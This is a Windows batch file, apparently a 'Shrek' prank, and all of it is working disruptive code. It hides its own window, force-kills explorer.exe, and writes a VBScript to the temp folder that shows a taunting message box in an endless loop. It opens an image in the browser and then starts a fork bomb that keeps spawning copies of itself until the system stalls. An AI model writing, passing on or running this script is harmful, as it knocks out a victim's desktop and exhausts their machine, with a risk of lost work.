@echo off

if "%1"=="" (
    start "" /min "%~f0" min setup
    exit
)
if "%1" NEQ "min" exit

if "%2"=="setup" (
    goto setup
) else if "%2"=="vbs-loop" (
    goto vbs-loop
) else if "%2"=="fork" (
    goto fork
)

:setup

start "" /min powershell -command "(new-object -com shell.application).minimizeall()"

taskkill /F /im explorer.exe

(
echo Do
echo MsgBox "You have been shreked :("
echo Loop
) > "%temp%\shrek_popup.vbs"


start "" /max "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg"

timeout /t 1 /nobreak >nul
start %temp%\shrek_popup.vbs

timeout /t 10 /nobreak >nul


:fork

start "" /min "%~f0" min fork

goto fork

exit


:vbs-loop

start "" "%temp%\shrek_popup.vbs"
timeout /t 1 /nobreak >nul

goto vbs-loop

exit
